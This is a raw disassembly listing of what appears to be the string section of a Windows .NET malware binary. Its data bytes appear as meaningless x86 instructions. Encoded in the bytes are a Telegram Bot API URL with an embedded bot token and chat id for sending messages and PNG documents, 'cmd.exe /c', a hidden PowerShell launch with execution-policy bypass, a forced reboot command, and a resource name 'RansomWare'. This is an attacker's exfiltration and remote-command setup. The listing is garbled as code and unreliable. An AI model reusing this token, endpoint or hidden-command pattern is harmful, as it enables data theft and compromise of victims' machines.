  4084fc:	71 00                	jno    0x4084fe
  4084fe:	73 00                	jae    0x408500
  408500:	5f                   	pop    %edi
  408501:	00 73 00             	add    %dh,0x0(%ebx)
  408504:	2f                   	das
  408505:	00 73 00             	add    %dh,0x0(%ebx)
  408508:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40850c:	64 00 4d 00          	add    %cl,%fs:0x0(%ebp)
  408510:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  408514:	73 00                	jae    0x408516
  408516:	61                   	popa
  408517:	00 67 00             	add    %ah,0x0(%edi)
  40851a:	65 00 00             	add    %al,%gs:(%eax)
  40851d:	15 37 00 34 00       	adc    $0x340037,%eax
  408522:	37                   	aaa
  408523:	00 32                	add    %dh,(%edx)
  408525:	00 37                	add    %dh,(%edi)
  408527:	00 32                	add    %dh,(%edx)
  408529:	00 36                	add    %dh,(%esi)
  40852b:	00 37                	add    %dh,(%edi)
  40852d:	00 36                	add    %dh,(%esi)
  40852f:	00 38                	add    %bh,(%eax)
  408531:	00 00                	add    %al,(%eax)
  408533:	09 48 00             	or     %ecx,0x0(%eax)
  408536:	54                   	push   %esp
  408537:	00 4d 00             	add    %cl,0x0(%ebp)
  40853a:	4c                   	dec    %esp
  40853b:	00 00                	add    %al,(%eax)
  40853d:	80 af 68 00 74 00 74 	subb   $0x74,0x740068(%edi)
  408544:	00 70 00             	add    %dh,0x0(%eax)
  408547:	73 00                	jae    0x408549
  408549:	3a 00                	cmp    (%eax),%al
  40854b:	2f                   	das
  40854c:	00 2f                	add    %ch,(%edi)
  40854e:	00 61 00             	add    %ah,0x0(%ecx)
  408551:	70 00                	jo     0x408553
  408553:	69 00 2e 00 74 00    	imul   $0x74002e,(%eax),%eax
  408559:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  40855e:	00 67 00             	add    %ah,0x0(%edi)
  408561:	72 00                	jb     0x408563
  408563:	61                   	popa
  408564:	00 6d 00             	add    %ch,0x0(%ebp)
  408567:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40856b:	72 00                	jb     0x40856d
  40856d:	67 00 2f             	add    %ch,(%bx)
  408570:	00 62 00             	add    %ah,0x0(%edx)
  408573:	6f                   	outsl  %ds:(%esi),(%dx)
  408574:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  408578:	00 37                	add    %dh,(%edi)
  40857a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40857d:	36 00 36             	add    %dh,%ss:(%esi)
  408580:	00 33                	add    %dh,(%ebx)
  408582:	00 32                	add    %dh,(%edx)
  408584:	00 33                	add    %dh,(%ebx)
  408586:	00 34 00             	add    %dh,(%eax,%eax,1)
  408589:	38 00                	cmp    %al,(%eax)
  40858b:	3a 00                	cmp    (%eax),%al
  40858d:	41                   	inc    %ecx
  40858e:	00 41 00             	add    %al,0x0(%ecx)
  408591:	48                   	dec    %eax
  408592:	00 4e 00             	add    %cl,0x0(%esi)
  408595:	63 00                	arpl   %eax,(%eax)
  408597:	33 00                	xor    (%eax),%eax
  408599:	75 00                	jne    0x40859b
  40859b:	79 00                	jns    0x40859d
  40859d:	74 00                	je     0x40859f
  40859f:	69 00 33 00 38 00    	imul   $0x380033,(%eax),%eax
  4085a5:	6a 00                	push   $0x0
  4085a7:	5a                   	pop    %edx
  4085a8:	00 30                	add    %dh,(%eax)
  4085aa:	00 4d 00             	add    %cl,0x0(%ebp)
  4085ad:	65 00 53 00          	add    %dl,%gs:0x0(%ebx)
  4085b1:	39 00                	cmp    %eax,(%eax)
  4085b3:	4d                   	dec    %ebp
  4085b4:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  4085b8:	00 71 00             	add    %dh,0x0(%ecx)
  4085bb:	76 00                	jbe    0x4085bd
  4085bd:	65 00 4c 00 61       	add    %cl,%gs:0x61(%eax,%eax,1)
  4085c2:	00 69 00             	add    %ch,0x0(%ecx)
  4085c5:	59                   	pop    %ecx
  4085c6:	00 62 00             	add    %ah,0x0(%edx)
  4085c9:	77 00                	ja     0x4085cb
  4085cb:	71 00                	jno    0x4085cd
  4085cd:	73 00                	jae    0x4085cf
  4085cf:	5f                   	pop    %edi
  4085d0:	00 73 00             	add    %dh,0x0(%ebx)
  4085d3:	2f                   	das
  4085d4:	00 73 00             	add    %dh,0x0(%ebx)
  4085d7:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4085db:	64 00 44 00 6f       	add    %al,%fs:0x6f(%eax,%eax,1)
  4085e0:	00 63 00             	add    %ah,0x0(%ebx)
  4085e3:	75 00                	jne    0x4085e5
  4085e5:	6d                   	insl   (%dx),%es:(%edi)
  4085e6:	00 65 00             	add    %ah,0x0(%ebp)
  4085e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ea:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4085ee:	3f                   	aas
  4085ef:	2d 00 2d 00 2d       	sub    $0x2d002d00,%eax
  4085f4:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  4085fa:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  408600:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  408606:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40860c:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  408612:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  408618:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  40861e:	00 2d 00 2d 00 2d    	add    %ch,0x2d002d00
  408624:	00 2d 00 7b 00 30    	add    %ch,0x30007b00
  40862a:	00 7d 00             	add    %bh,0x0(%ebp)
  40862d:	01 3d 6d 00 75 00    	add    %edi,0x75006d
  408633:	6c                   	insb   (%dx),%es:(%edi)
  408634:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  408638:	00 70 00             	add    %dh,0x0(%eax)
  40863b:	61                   	popa
  40863c:	00 72 00             	add    %dh,0x0(%edx)
  40863f:	74 00                	je     0x408641
  408641:	2f                   	das
  408642:	00 66 00             	add    %ah,0x0(%esi)
  408645:	6f                   	outsl  %ds:(%esi),(%dx)
  408646:	00 72 00             	add    %dh,0x0(%edx)
  408649:	6d                   	insl   (%dx),%es:(%edi)
  40864a:	00 2d 00 64 00 61    	add    %ch,0x61006400
  408650:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  408654:	00 3b                	add    %bh,(%ebx)
  408656:	00 20                	add    %ah,(%eax)
  408658:	00 62 00             	add    %ah,0x0(%edx)
  40865b:	6f                   	outsl  %ds:(%esi),(%dx)
  40865c:	00 75 00             	add    %dh,0x0(%ebp)
  40865f:	6e                   	outsb  %ds:(%esi),(%dx)
  408660:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  408664:	00 72 00             	add    %dh,0x0(%edx)
  408667:	79 00                	jns    0x408669
  408669:	3d 00 01 09 0d       	cmp    $0xd090100,%eax
  40866e:	00 0a                	add    %cl,(%edx)
  408670:	00 2d 00 2d 00 01    	add    %ch,0x1002d00
  408676:	09 2d 00 2d 00 0d    	or     %ebp,0xd002d00
  40867c:	00 0a                	add    %cl,(%edx)
  40867e:	00 01                	add    %al,(%ecx)
  408680:	79 43                	jns    0x4086c5
  408682:	00 6f 00             	add    %ch,0x0(%edi)
  408685:	6e                   	outsb  %ds:(%esi),(%dx)
  408686:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40868a:	00 6e 00             	add    %ch,0x0(%esi)
  40868d:	74 00                	je     0x40868f
  40868f:	2d 00 44 00 69       	sub    $0x69004400,%eax
  408694:	00 73 00             	add    %dh,0x0(%ebx)
  408697:	70 00                	jo     0x408699
  408699:	6f                   	outsl  %ds:(%esi),(%dx)
  40869a:	00 73 00             	add    %dh,0x0(%ebx)
  40869d:	69 00 74 00 69 00    	imul   $0x690074,(%eax),%eax
  4086a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4086a4:	00 6e 00             	add    %ch,0x0(%esi)
  4086a7:	3a 00                	cmp    (%eax),%al
  4086a9:	20 00                	and    %al,(%eax)
  4086ab:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4086af:	72 00                	jb     0x4086b1
  4086b1:	6d                   	insl   (%dx),%es:(%edi)
  4086b2:	00 2d 00 64 00 61    	add    %ch,0x61006400
  4086b8:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  4086bc:	00 3b                	add    %bh,(%ebx)
  4086be:	00 20                	add    %ah,(%eax)
  4086c0:	00 6e 00             	add    %ch,0x0(%esi)
  4086c3:	61                   	popa
  4086c4:	00 6d 00             	add    %ch,0x0(%ebp)
  4086c7:	65 00 3d 00 22 00 63 	add    %bh,%gs:0x63002200
  4086ce:	00 68 00             	add    %ch,0x0(%eax)
  4086d1:	61                   	popa
  4086d2:	00 74 00 5f          	add    %dh,0x5f(%eax,%eax,1)
  4086d6:	00 69 00             	add    %ch,0x0(%ecx)
  4086d9:	64 00 22             	add    %ah,%fs:(%edx)
  4086dc:	00 0d 00 0a 00 0d    	add    %cl,0xd000a00
  4086e2:	00 0a                	add    %cl,(%edx)
  4086e4:	00 37                	add    %dh,(%edi)
  4086e6:	00 34 00             	add    %dh,(%eax,%eax,1)
  4086e9:	37                   	aaa
  4086ea:	00 32                	add    %dh,(%edx)
  4086ec:	00 37                	add    %dh,(%edi)
  4086ee:	00 32                	add    %dh,(%edx)
  4086f0:	00 36                	add    %dh,(%esi)
  4086f2:	00 37                	add    %dh,(%edi)
  4086f4:	00 36                	add    %dh,(%esi)
  4086f6:	00 38                	add    %bh,(%eax)
  4086f8:	00 01                	add    %al,(%ecx)
  4086fa:	77 43                	ja     0x40873f
  4086fc:	00 6f 00             	add    %ch,0x0(%edi)
  4086ff:	6e                   	outsb  %ds:(%esi),(%dx)
  408700:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408704:	00 6e 00             	add    %ch,0x0(%esi)
  408707:	74 00                	je     0x408709
  408709:	2d 00 44 00 69       	sub    $0x69004400,%eax
  40870e:	00 73 00             	add    %dh,0x0(%ebx)
  408711:	70 00                	jo     0x408713
  408713:	6f                   	outsl  %ds:(%esi),(%dx)
  408714:	00 73 00             	add    %dh,0x0(%ebx)
  408717:	69 00 74 00 69 00    	imul   $0x690074,(%eax),%eax
  40871d:	6f                   	outsl  %ds:(%esi),(%dx)
  40871e:	00 6e 00             	add    %ch,0x0(%esi)
  408721:	3a 00                	cmp    (%eax),%al
  408723:	20 00                	and    %al,(%eax)
  408725:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  408729:	72 00                	jb     0x40872b
  40872b:	6d                   	insl   (%dx),%es:(%edi)
  40872c:	00 2d 00 64 00 61    	add    %ch,0x61006400
  408732:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  408736:	00 3b                	add    %bh,(%ebx)
  408738:	00 20                	add    %ah,(%eax)
  40873a:	00 6e 00             	add    %ch,0x0(%esi)
  40873d:	61                   	popa
  40873e:	00 6d 00             	add    %ch,0x0(%ebp)
  408741:	65 00 3d 00 22 00 64 	add    %bh,%gs:0x64002200
  408748:	00 6f 00             	add    %ch,0x0(%edi)
  40874b:	63 00                	arpl   %eax,(%eax)
  40874d:	75 00                	jne    0x40874f
  40874f:	6d                   	insl   (%dx),%es:(%edi)
  408750:	00 65 00             	add    %ah,0x0(%ebp)
  408753:	6e                   	outsb  %ds:(%esi),(%dx)
  408754:	00 74 00 22          	add    %dh,0x22(%eax,%eax,1)
  408758:	00 3b                	add    %bh,(%ebx)
  40875a:	00 20                	add    %ah,(%eax)
  40875c:	00 66 00             	add    %ah,0x0(%esi)
  40875f:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  408765:	6e                   	outsb  %ds:(%esi),(%dx)
  408766:	00 61 00             	add    %ah,0x0(%ecx)
  408769:	6d                   	insl   (%dx),%es:(%edi)
  40876a:	00 65 00             	add    %ah,0x0(%ebp)
  40876d:	3d 00 22 00 01       	cmp    $0x1002200,%eax
  408772:	3d 22 00 0d 00       	cmp    $0xd0022,%eax
  408777:	0a 00                	or     (%eax),%al
  408779:	43                   	inc    %ebx
  40877a:	00 6f 00             	add    %ch,0x0(%edi)
  40877d:	6e                   	outsb  %ds:(%esi),(%dx)
  40877e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  408782:	00 6e 00             	add    %ch,0x0(%esi)
  408785:	74 00                	je     0x408787
  408787:	2d 00 54 00 79       	sub    $0x79005400,%eax
  40878c:	00 70 00             	add    %dh,0x0(%eax)
  40878f:	65 00 3a             	add    %bh,%gs:(%edx)
  408792:	00 20                	add    %ah,(%eax)
  408794:	00 69 00             	add    %ch,0x0(%ecx)
  408797:	6d                   	insl   (%dx),%es:(%edi)
  408798:	00 61 00             	add    %ah,0x0(%ecx)
  40879b:	67 00 65 00          	add    %ah,0x0(%di)
  40879f:	2f                   	das
  4087a0:	00 70 00             	add    %dh,0x0(%eax)
  4087a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4087a4:	00 67 00             	add    %ah,0x0(%edi)
  4087a7:	0d 00 0a 00 0d       	or     $0xd000a00,%eax
  4087ac:	00 0a                	add    %cl,(%edx)
  4087ae:	00 01                	add    %al,(%ecx)
  4087b0:	09 50 00             	or     %edx,0x0(%eax)
  4087b3:	4f                   	dec    %edi
  4087b4:	00 53 00             	add    %dl,0x0(%ebx)
  4087b7:	54                   	push   %esp
  4087b8:	00 00                	add    %al,(%eax)
  4087ba:	0f 63 00             	packsswb (%eax),%mm0
  4087bd:	6d                   	insl   (%dx),%es:(%edi)
  4087be:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  4087c2:	00 65 00             	add    %ah,0x0(%ebp)
  4087c5:	78 00                	js     0x4087c7
  4087c7:	65 00 00             	add    %al,%gs:(%eax)
  4087ca:	07                   	pop    %es
  4087cb:	2f                   	das
  4087cc:	00 63 00             	add    %ah,0x0(%ebx)
  4087cf:	20 00                	and    %al,(%eax)
  4087d1:	00 1d 70 00 6f 00    	add    %bl,0x6f0070
  4087d7:	77 00                	ja     0x4087d9
  4087d9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4087dd:	73 00                	jae    0x4087df
  4087df:	68 00 65 00 6c       	push   $0x6c006500
  4087e4:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  4087e8:	00 65 00             	add    %ah,0x0(%ebp)
  4087eb:	78 00                	js     0x4087ed
  4087ed:	65 00 00             	add    %al,%gs:(%eax)
  4087f0:	67 2d 00 45 00 78    	addr16 sub $0x78004500,%eax
  4087f6:	00 65 00             	add    %ah,0x0(%ebp)
  4087f9:	63 00                	arpl   %eax,(%eax)
  4087fb:	75 00                	jne    0x4087fd
  4087fd:	74 00                	je     0x4087ff
  4087ff:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  408805:	50                   	push   %eax
  408806:	00 6f 00             	add    %ch,0x0(%edi)
  408809:	6c                   	insb   (%dx),%es:(%edi)
  40880a:	00 69 00             	add    %ch,0x0(%ecx)
  40880d:	63 00                	arpl   %eax,(%eax)
  40880f:	79 00                	jns    0x408811
  408811:	20 00                	and    %al,(%eax)
  408813:	42                   	inc    %edx
  408814:	00 79 00             	add    %bh,0x0(%ecx)
  408817:	70 00                	jo     0x408819
  408819:	61                   	popa
  40881a:	00 73 00             	add    %dh,0x0(%ebx)
  40881d:	73 00                	jae    0x40881f
  40881f:	20 00                	and    %al,(%eax)
  408821:	2d 00 57 00 69       	sub    $0x69005700,%eax
  408826:	00 6e 00             	add    %ch,0x0(%esi)
  408829:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40882d:	77 00                	ja     0x40882f
  40882f:	53                   	push   %ebx
  408830:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  408834:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  408838:	00 20                	add    %ah,(%eax)
  40883a:	00 48 00             	add    %cl,0x0(%eax)
  40883d:	69 00 64 00 64 00    	imul   $0x640064,(%eax),%eax
  408843:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  408847:	20 00                	and    %al,(%eax)
  408849:	2d 00 46 00 69       	sub    $0x69004600,%eax
  40884e:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  408852:	00 20                	add    %ah,(%eax)
  408854:	00 22                	add    %ah,(%edx)
  408856:	00 01                	add    %al,(%ecx)
  408858:	03 22                	add    (%edx),%esp
  40885a:	00 00                	add    %al,(%eax)
  40885c:	27                   	daa
  40885d:	73 00                	jae    0x40885f
  40885f:	68 00 75 00 74       	push   $0x74007500
  408864:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  408868:	00 77 00             	add    %dh,0x0(%edi)
  40886b:	6e                   	outsb  %ds:(%esi),(%dx)
  40886c:	00 20                	add    %ah,(%eax)
  40886e:	00 2f                	add    %ch,(%edi)
  408870:	00 72 00             	add    %dh,0x0(%edx)
  408873:	20 00                	and    %al,(%eax)
  408875:	2f                   	das
  408876:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  40887a:	00 33                	add    %dh,(%ebx)
  40887c:	00 20                	add    %ah,(%eax)
  40887e:	00 2f                	add    %ch,(%edi)
  408880:	00 66 00             	add    %ah,0x0(%esi)
  408883:	00 0f                	add    %cl,(%edi)
  408885:	45                   	inc    %ebp
  408886:	00 72 00             	add    %dh,0x0(%edx)
  408889:	72 00                	jb     0x40888b
  40888b:	6f                   	outsl  %ds:(%esi),(%dx)
  40888c:	00 72 00             	add    %dh,0x0(%edx)
  40888f:	3a 00                	cmp    (%eax),%al
  408891:	20 00                	and    %al,(%eax)
  408893:	00 3f                	add    %bh,(%edi)
  408895:	52                   	push   %edx
  408896:	00 61 00             	add    %ah,0x0(%ecx)
  408899:	6e                   	outsb  %ds:(%esi),(%dx)
  40889a:	00 73 00             	add    %dh,0x0(%ebx)
  40889d:	6f                   	outsl  %ds:(%esi),(%dx)
  40889e:	00 6d 00             	add    %ch,0x0(%ebp)
  4088a1:	57                   	push   %edi
  4088a2:	00 61 00             	add    %ah,0x0(%ecx)
  4088a5:	72 00                	jb     0x4088a7
  4088a7:	65 00 2e             	add    %ch,%gs:(%esi)
  4088aa:	00 50 00             	add    %dl,0x0(%eax)
  4088ad:	72 00                	jb     0x4088af
  4088af:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b0:	00 70 00             	add    %dh,0x0(%eax)
  4088b3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4088b7:	74 00                	je     0x4088b9
  4088b9:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4088bf:	2e 00 52 00          	add    %dl,%cs:0x0(%edx)
  4088c3:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4088c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c8:	00 75 00             	add    %dh,0x0(%ebp)
  4088cb:	72 00                	jb     0x4088cd
  4088cd:	63 00                	arpl   %eax,(%eax)
  4088cf:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4088d3:	00 f2                	add    %dh,%dl
  4088d5:	47                   	inc    %edi
  4088d6:	d8 87 c6 18 3b 47    	fadds  0x473b18c6(%edi)
  4088dc:	8b 90 c5 92 17 d5    	mov    -0x2ae86d3b(%eax),%edx
  4088e2:	55                   	push   %ebp
  4088e3:	d2 00                	rolb   %cl,(%eax)
  4088e5:	04 20                	add    $0x20,%al
  4088e7:	01 01                	add    %eax,(%ecx)
  4088e9:	08 03                	or     %al,(%ebx)
  4088eb:	20 00                	and    %al,(%eax)
  4088ed:	01 05 20 01 01 11    	add    %eax,0x11010120
  4088f3:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4088f6:	01 01                	add    %eax,(%ecx)
  4088f8:	0e                   	push   %cs
  4088f9:	04 20                	add    $0x20,%al
  4088fb:	01 01                	add    %eax,(%ecx)
  4088fd:	02 05 20 01 01 11    	add    0x11010120,%al
  408903:	4d                   	dec    %ebp
  408904:	05 20 02 01 0e       	add    $0xe010220,%eax
  408909:	0e                   	push   %cs
  40890a:	06                   	push   %es
  40890b:	20 01                	and    %al,(%ecx)
  40890d:	01 11                	add    %edx,(%ecx)
  40890f:	80 bd 0a 15 12 08 03 	cmpb   $0x3,0x812150a(%ebp)
  408916:	13 00                	adc    (%eax),%eax
  408918:	13 01                	adc    (%ecx),%eax
  40891a:	13 02                	adc    (%edx),%eax
  40891c:	03 06                	add    (%esi),%eax
  40891e:	13 00                	adc    (%eax),%eax
  408920:	03 06                	add    (%esi),%eax
  408922:	13 01                	adc    (%ecx),%eax
  408924:	03 06                	add    (%esi),%eax
  408926:	13 02                	adc    (%edx),%eax
  408928:	0c 07                	or     $0x7,%al
  40892a:	01 15 12 08 03 13    	add    %edx,0x13030812
  408930:	00 13                	add    %dl,(%ebx)
  408932:	01 13                	add    %edx,(%ebx)
  408934:	02 07                	add    (%edi),%al
  408936:	15 12 80 c9 01       	adc    $0x1c98012,%eax
  40893b:	13 00                	adc    (%eax),%eax
  40893d:	09 00                	or     %eax,(%eax)
  40893f:	00 15 12 80 c9 01    	add    %dl,0x1c98012
  408945:	13 00                	adc    (%eax),%eax
  408947:	07                   	pop    %es
  408948:	20 02                	and    %al,(%edx)
  40894a:	02 13                	add    (%ebx),%dl
  40894c:	00 13                	add    %dl,(%ebx)
  40894e:	00 07                	add    %al,(%edi)
  408950:	15 12 80 c9 01       	adc    $0x1c98012,%eax
  408955:	13 01                	adc    (%ecx),%eax
  408957:	07                   	pop    %es
  408958:	15 12 80 c9 01       	adc    $0x1c98012,%eax
  40895d:	13 02                	adc    (%edx),%eax
  40895f:	05 20 01 08 13       	add    $0x13080120,%eax
  408964:	00 08                	add    %cl,(%eax)
  408966:	07                   	pop    %es
  408967:	03 13                	add    (%ebx),%edx
  408969:	00 13                	add    %dl,(%ebx)
  40896b:	01 13                	add    %edx,(%ebx)
  40896d:	02 02                	add    (%edx),%al
  40896f:	13 00                	adc    (%eax),%eax
  408971:	03 20                	add    (%eax),%esp
  408973:	00 0e                	add    %cl,(%esi)
  408975:	02 13                	add    (%ebx),%dl
  408977:	01 02                	add    %eax,(%edx)
  408979:	13 02                	adc    (%edx),%eax
  40897b:	09 00                	or     %eax,(%eax)
  40897d:	03 0e                	add    (%esi),%ecx
  40897f:	12 80 d1 0e 1d 1c    	adc    0x1c1d0ed1(%eax),%al
  408985:	07                   	pop    %es
  408986:	07                   	pop    %es
  408987:	04 18                	add    $0x18,%al
  408989:	02 12                	add    (%edx),%dl
  40898b:	10 02                	adc    %al,(%edx)
  40898d:	03 00                	add    (%eax),%eax
  40898f:	00 01                	add    %al,(%ecx)
  408991:	04 00                	add    $0x0,%al
  408993:	01 01                	add    %eax,(%ecx)
  408995:	02 05 00 01 01 12    	add    0x12010100,%al
  40899b:	61                   	popa
  40899c:	08 07                	or     %al,(%edi)
  40899e:	04 12                	add    $0x12,%al
  4089a0:	5d                   	pop    %ebp
  4089a1:	02 12                	add    (%edx),%dl
  4089a3:	5d                   	pop    %ebp
  4089a4:	02 03                	add    (%ebx),%al
  4089a6:	06                   	push   %es
  4089a7:	12 5d 05             	adc    0x5(%ebp),%bl
  4089aa:	20 01                	and    %al,(%ecx)
  4089ac:	12 5d 0e             	adc    0xe(%ebp),%bl
  4089af:	05 20 02 01 0e       	add    $0xe010220,%eax
  4089b4:	1c 03                	sbb    $0x3,%al
  4089b6:	00 00                	add    %al,(%eax)
  4089b8:	0e                   	push   %cs
  4089b9:	04 00                	add    $0x0,%al
  4089bb:	01 0e                	add    %ecx,(%esi)
  4089bd:	0e                   	push   %cs
  4089be:	06                   	push   %es
  4089bf:	20 01                	and    %al,(%ecx)
  4089c1:	01 11                	add    %edx,(%ecx)
  4089c3:	80 e5 04             	and    $0x4,%ch
  4089c6:	20 01                	and    %al,(%ecx)
  4089c8:	01 0d 06 20 01 01    	add    %ecx,0x1012006
  4089ce:	11 80 e9 04 00 01    	adc    %eax,0x10004e9(%eax)
  4089d4:	01 08                	add    %ecx,(%eax)
  4089d6:	68 07 49 0e 0e       	push   $0xe0e4907
  4089db:	0e                   	push   %cs
  4089dc:	0e                   	push   %cs
  4089dd:	0e                   	push   %cs
  4089de:	0e                   	push   %cs
  4089df:	0e                   	push   %cs
  4089e0:	0e                   	push   %cs
  4089e1:	1d 0e 12 5d 02       	sbb    $0x25d120e,%eax
  4089e6:	12 5d 02             	adc    0x2(%ebp),%bl
  4089e9:	12 5d 02             	adc    0x2(%ebp),%bl
  4089ec:	12 5d 02             	adc    0x2(%ebp),%bl
  4089ef:	12 5d 02             	adc    0x2(%ebp),%bl
  4089f2:	12 5d 12             	adc    0x12(%ebp),%bl
  4089f5:	5d                   	pop    %ebp
  4089f6:	02 12                	add    (%edx),%dl
  4089f8:	5d                   	pop    %ebp
  4089f9:	12 5d 0e             	adc    0xe(%ebp),%bl
  4089fc:	02 12                	add    (%edx),%dl
  4089fe:	5d                   	pop    %ebp
  4089ff:	0e                   	push   %cs
  408a00:	02 12                	add    (%edx),%dl
  408a02:	5d                   	pop    %ebp
  408a03:	02 12                	add    (%edx),%dl
  408a05:	5d                   	pop    %ebp
  408a06:	12 5d 0e             	adc    0xe(%ebp),%bl
  408a09:	02 12                	add    (%edx),%dl
  408a0b:	5d                   	pop    %ebp
  408a0c:	0e                   	push   %cs
  408a0d:	02 12                	add    (%edx),%dl
  408a0f:	5d                   	pop    %ebp
  408a10:	02 12                	add    (%edx),%dl
  408a12:	5d                   	pop    %ebp
  408a13:	11 71 12             	adc    %esi,0x12(%ecx)
  408a16:	5d                   	pop    %ebp
  408a17:	02 12                	add    (%edx),%dl
  408a19:	5d                   	pop    %ebp
  408a1a:	12 5d 0e             	adc    0xe(%ebp),%bl
  408a1d:	02 12                	add    (%edx),%dl
  408a1f:	5d                   	pop    %ebp
  408a20:	02 02                	add    (%edx),%al
  408a22:	02 02                	add    (%edx),%al
  408a24:	0e                   	push   %cs
  408a25:	02 12                	add    (%edx),%dl
  408a27:	5d                   	pop    %ebp
  408a28:	02 12                	add    (%edx),%dl
  408a2a:	5d                   	pop    %ebp
  408a2b:	12 5d 02             	adc    0x2(%ebp),%bl
  408a2e:	12 5d 02             	adc    0x2(%ebp),%bl
  408a31:	12 5d 02             	adc    0x2(%ebp),%bl
  408a34:	1d 0e 08 0e 02       	sbb    $0x20e080e,%eax
  408a39:	0e                   	push   %cs
  408a3a:	0e                   	push   %cs
  408a3b:	02 02                	add    (%edx),%al
  408a3d:	12 75 06             	adc    0x6(%ebp),%dh
  408a40:	20 02                	and    %al,(%edx)
  408a42:	12 5d 0e             	adc    0xe(%ebp),%bl
  408a45:	02 05 20 02 1c 0e    	add    0xe1c0220,%al
  408a4b:	1c 04                	sbb    $0x4,%al
  408a4d:	20 01                	and    %al,(%ecx)
  408a4f:	02 0e                	add    (%esi),%cl
  408a51:	06                   	push   %es
  408a52:	00 03                	add    %al,(%ebx)
  408a54:	0e                   	push   %cs
  408a55:	0e                   	push   %cs
  408a56:	0e                   	push   %cs
  408a57:	0e                   	push   %cs
  408a58:	04 00                	add    $0x0,%al
  408a5a:	00 11                	add    %dl,(%ecx)
  408a5c:	71 04                	jno    0x408a62
  408a5e:	20 01                	and    %al,(%ecx)
  408a60:	0e                   	push   %cs
  408a61:	0e                   	push   %cs
  408a62:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  408a67:	0e                   	push   %cs
  408a68:	08 20                	or     %ah,(%eax)
  408a6a:	03 01                	add    (%ecx),%eax
  408a6c:	0e                   	push   %cs
  408a6d:	1c 11                	sbb    $0x11,%al
  408a6f:	80 f1 06             	xor    $0x6,%cl
  408a72:	00 01                	add    %al,(%ecx)
  408a74:	0e                   	push   %cs
  408a75:	11 80 f9 04 00 01    	adc    %eax,0x10004f9(%eax)
  408a7b:	02 0e                	add    (%esi),%cl
  408a7d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  408a82:	0e                   	push   %cs
  408a83:	05 00 02 01 0e       	add    $0xe010200,%eax
  408a88:	0e                   	push   %cs
  408a89:	06                   	push   %es
  408a8a:	00 03                	add    %al,(%ebx)
  408a8c:	01 0e                	add    %ecx,(%esi)
  408a8e:	0e                   	push   %cs
  408a8f:	02 05 07 03 02 0e    	add    0xe020307,%al
  408a95:	02 07                	add    (%edi),%al
  408a97:	00 02                	add    %al,(%edx)
  408a99:	01 0e                	add    %ecx,(%esi)
  408a9b:	11 81 01 03 07 01    	adc    %eax,0x1070301(%ecx)
  408aa1:	0e                   	push   %cs
  408aa2:	07                   	pop    %es
  408aa3:	07                   	pop    %es
  408aa4:	03 12                	add    (%edx),%edx
  408aa6:	5d                   	pop    %ebp
  408aa7:	02 12                	add    (%edx),%dl
  408aa9:	5d                   	pop    %ebp
  408aaa:	05 20 02 01 1c       	add    $0x1c010220,%eax
  408aaf:	18 08                	sbb    %cl,(%eax)
  408ab1:	00 01                	add    %al,(%ecx)
  408ab3:	12 81 09 12 81 05    	adc    0x5811209(%ecx),%al
  408ab9:	05 07 02 12 5d       	add    $0x5d120207,%eax
  408abe:	02 04 07             	add    (%edi,%eax,1),%al
  408ac1:	01 12                	add    %edx,(%edx)
  408ac3:	79 06                	jns    0x408acb
  408ac5:	20 01                	and    %al,(%ecx)
  408ac7:	01 12                	add    %edx,(%edx)
  408ac9:	80 a9 05 07 02 0e 12 	subb   $0x12,0xe020705(%ecx)
  408ad0:	79 1a                	jns    0x408aec
  408ad2:	07                   	pop    %es
  408ad3:	0e                   	push   %cs
  408ad4:	15 12 7d 01 0e       	adc    $0xe017d12,%eax
  408ad9:	08 1d 0e 08 0e 15    	or     %bl,0x150e080e
  408adf:	11 80 81 01 0e 0e    	adc    %eax,0xe0e0181(%eax)
